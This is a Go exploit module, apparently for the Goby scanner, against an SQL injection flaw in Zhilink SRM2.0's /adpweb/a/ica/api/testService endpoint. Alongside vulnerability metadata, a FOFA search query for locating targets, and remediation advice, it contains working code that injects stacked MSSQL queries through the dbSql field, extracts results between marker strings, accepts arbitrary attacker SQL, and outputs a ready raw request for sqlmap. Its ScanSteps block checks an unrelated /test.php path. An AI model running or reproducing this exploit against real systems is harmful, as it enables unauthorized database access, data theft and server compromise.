package exploits

import (
	"errors"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Zhilink SRM2.0 /adpweb/a/ica/api/testService SQL Injection Vulnerability",
    "Description": "<p>Relying on cutting-edge technologies such as artificial intelligence, Internet of Things, big data, and cloud, SRM2.0 is a systematic solution for enterprises to achieve more predictable strategic sourcing, more forward-looking supplier management, and more automatic procurement execution, so as to enable enterprises to execute procurement efficiently, shorten the supply cycle and increase the turnover frequency. Maintain a good supply relationship, obtain a more cost-effective source of goods, and build a community of interests.  </p><p> Attackers can access the data in the database without authorization, steal users' privacy and personal information, and cause information leakage. You can add or delete data from the database, such as adding or deleting administrator accounts. If the website directory has write permissions, you can write a web Trojan. Attackers can then tamper with web pages and publish illegal information. After privilege escalation and other steps, the highest privilege of the server is obtained by the attacker. An attacker can remotely control a server, install a backdoor, and modify or control the operating system.</p>",
    "Product": "Zhilink SRM2.0",
    "Homepage": "https://www.zhilink.com/products.html",
    "DisclosureDate": "2024-10-24",
    "PostTime": "2024-10-24",
    "Author": "2974057526@qq.com",
    "FofaQuery": "(body=\"function changeTableMode()\" || title==\"SRM 2.0\") && header=\"Content-Type: text/html\"",
    "GobyQuery": "(body=\"function changeTableMode()\" || title==\"SRM 2.0\") && header=\"Content-Type: text/html\"",
    "Level": "1",
    "Impact": "<p>Attackers can access the data in the database without authorization, steal users' privacy and personal information, and cause information leakage. You can add or delete data from the database, such as adding or deleting administrator accounts. If the website directory has write permissions, you can write a web Trojan. Attackers can then tamper with web pages and publish illegal information. After privilege escalation and other steps, the highest privilege of the server is obtained by the attacker. An attacker can remotely control a server, install a backdoor, and modify or control the operating system.</p>",
    "Recommendation": "<p>1. Use precompiled statements: Parameterized queries and precompiled statements (such as Prepared Statements) can ensure that the input data is processed as parameters, so as to avoid direct insertion into SQL statements. </p><p> 2. Input validation: Strict verification of user input to ensure that only data within the legal range is received.You can use a whitelist policy to filter out all invalid characters.  </p><p> 3. Principle of least privilege: The database account should only be granted the minimum permission to perform the required operations, and avoid using high-privilege accounts to connect to the database. </p><p> 4. Error message handling: Avoid displaying detailed database error information on the front end, so as not to leak the system structure and database information.</p>",
    "References": [
        "https://blog.csdn.net/xc_214/article/details/143162864"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "example,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "example",
            "type": "select",
            "value": "DB_NAME(),SYSTEM_USER,@@VERSION",
            "show": "AttackType=example"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select @@VERSION",
            "show": "AttackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "智联云采 SRM2.0 /adpweb/a/ica/api/testService SQL 注入漏洞",
            "Product": "智联云采 SRM2.0",
            "Description": "<p>智联云采 SRM2.0是一款针对企业供应链采购管理难题及数字化转型需求，智联云采依托人工智能、物联网、大数据、云等前沿技术，沉淀产品系统化方案，帮助企业实现战略寻源更具预测性，供应商管理更具前瞻性，采购执行更具自动性，进而让企业采购高效执行，缩短供应周期及提高周转频次；维护良好的供应关系获取更高性价比的货源，构建利益共同体。&nbsp;</p><p>&nbsp;攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。 经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。<br></p>",
            "Recommendation": "<p>1、使用预编译语句：采用参数化查询和预编译语句（如Prepared Statements），可以确保输入数据作为参数处理，从而避免直接插入到SQL语句中。</p><p>&nbsp;2、输入验证：对用户输入进行严格验证，确保只接收合法范围内的数据。</p><p>可以使用白名单策略，过滤掉所有非法字符。&nbsp;</p><p>&nbsp;3、最小权限原则：数据库账户应仅授予执行所需操作的最低权限，避免使用高权限账户连接数据库。&nbsp;</p><p>&nbsp;4、错误信息处理：避免在前端展示详细的数据库错误信息，以免泄露系统结构和数据库信息。</p>",
            "Impact": "<p>攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。&nbsp;经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Zhilink SRM2.0 /adpweb/a/ica/api/testService SQL Injection Vulnerability",
            "Product": "Zhilink SRM2.0",
            "Description": "<p>Relying on cutting-edge technologies such as artificial intelligence, Internet of Things, big data, and cloud, SRM2.0 is a systematic solution for enterprises to achieve more predictable strategic sourcing, more forward-looking supplier management, and more automatic procurement execution, so as to enable enterprises to execute procurement efficiently, shorten the supply cycle and increase the turnover frequency. Maintain a good supply relationship, obtain a more cost-effective source of goods, and build a community of interests.&nbsp;&nbsp;</p><p>&nbsp;Attackers can access the data in the database without authorization, steal users' privacy and personal information, and cause information leakage. You can add or delete data from the database, such as adding or deleting administrator accounts. If the website directory has write permissions, you can write a web Trojan. Attackers can then tamper with web pages and publish illegal information. After privilege escalation and other steps, the highest privilege of the server is obtained by the attacker. An attacker can remotely control a server, install a backdoor, and modify or control the operating system.<br></p>",
            "Recommendation": "<p>1. Use precompiled statements: Parameterized queries and precompiled statements (such as Prepared Statements) can ensure that the input data is processed as parameters, so as to avoid direct insertion into SQL statements.&nbsp;</p><p>&nbsp;2. Input validation: Strict verification of user input to ensure that only data within the legal range is received.You can use a whitelist policy to filter out all invalid characters.&nbsp;&nbsp;</p><p>&nbsp;3. Principle of least privilege: The database account should only be granted the minimum permission to perform the required operations, and avoid using high-privilege accounts to connect to the database.&nbsp;</p><p>&nbsp;4. Error message handling: Avoid displaying detailed database error information on the front end, so as not to leak the system structure and database information.<br></p>",
            "Impact": "<p>Attackers can access the data in the database without authorization, steal users' privacy and personal information, and cause information leakage. You can add or delete data from the database, such as adding or deleting administrator accounts. If the website directory has write permissions, you can write a web Trojan. Attackers can then tamper with web pages and publish illegal information. After privilege escalation and other steps, the highest privilege of the server is obtained by the attacker. An attacker can remotely control a server, install a backdoor, and modify or control the operating system.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

	sendPayload_e8CnlW := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		// POST请求
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(url)
			PostRequest.Timeout = 12
			PostRequest.VerifyTls = false
			PostRequest.Data = `{"dbId": "1001", "dbSql": ";DECLARE @rdkk NVARCHAR(4000);SET @rdkk=(SELECT 'qvxjq'+(SELECT SUBSTRING((ISNULL(CAST((` + sql + `) AS NVARCHAR(4000)),CHAR(32))),1,634))+'qpjkq');EXEC @rdkk--", "responeTemplate": "{\n    \"std_data\": {\n        \"execution\": {\n            \"sqlcode\": \"$execution.sqlcode\",\n            \"description\": \"$execution.description\"\n        }\n}", "serviceCode": "test", "serviceName": "test", "serviceParams": "{\n    \"lang\": \"zh_CN\"\n}"}`
			PostRequest.FollowRedirect = false

			// 设置请求头
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}

			// 发送请求
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}
		url := `/adpweb/a/ica/api/testService`

		header := map[string]string{
			"Content-Type": "application/json",
		}
		resp, err := setPostRequest(hostInfo, url, header)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}

		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayload_e8CnlW
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符

			//检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配

			//如果是其他类型的注入,请按照具体情况进行检测
			sql := "DB_NAME()"
			resp, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, "qvxjq") {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/adpweb/a/ica/api/testService`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayload_e8CnlW
			attackType := goutils.B2S(stepLogs.Params["AttackType"])
			custom := goutils.B2S(stepLogs.Params["custom"])
			example := goutils.B2S(stepLogs.Params["example"])
			//Switch ExpParams
			//若自己修改ExpParams,请自行修改switch case
			switch attackType {
			case "custom":
				resp, err := sendPayload(expResult.HostInfo, custom)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				// 正则匹配利用结果,需自己修改
				// 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
				re := regexp.MustCompile(`qvxjq([\s\S]*?)qpjkq`)
				matches := re.FindAllStringSubmatch(resp.Utf8Html, -1)
				var sqlinformation string
				for _, match := range matches {
					sqlinformation = match[1]
				}
				if len(sqlinformation) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true

				expResult.Output = `The key points you need to extract is : ` + sqlinformation
				return expResult
			case "example":
				resp, err := sendPayload(expResult.HostInfo, example)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				// 正则匹配利用结果,需自己修改
				// 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
				re := regexp.MustCompile(`qvxjq([\s\S]*?)qpjkq`)
				matches := re.FindAllStringSubmatch(resp.Utf8Html, -1)
				var sqlinformation string
				for _, match := range matches {
					sqlinformation = match[1]
				}
				if len(sqlinformation) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true

				expResult.Output = `The key points you need to extract is : ` + sqlinformation
				return expResult

			case "sqlpoint":
				sql := "DB_NAME()"
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				//sqlPoint,给用户跑sqlmap用,需修改对应的参数
				expResult.Success = true
				expResult.Output = `POST /adpweb/a/ica/api/testService HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
Content-Type: application/json
Content-Length: 475

{"dbId": "1001", "dbSql": ";DECLARE @rdkk NVARCHAR(4000);SET @rdkk=(SELECT 'qvxjq'+(SELECT SUBSTRING((ISNULL(CAST((DB_NAME()) AS NVARCHAR(4000)),CHAR(32))),1,634))+'qpjkq');EXEC @rdkk--", "responeTemplate": "{\n    \"std_data\": {\n        \"execution\": {\n            \"sqlcode\": \"$execution.sqlcode\",\n            \"description\": \"$execution.description\"\n        }\n}", "serviceCode": "test", "serviceName": "test", "serviceParams": "{\n    \"lang\": \"zh_CN\"\n}"}
`
				return expResult
			//检查ExpParams是否设置正确
			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))
}
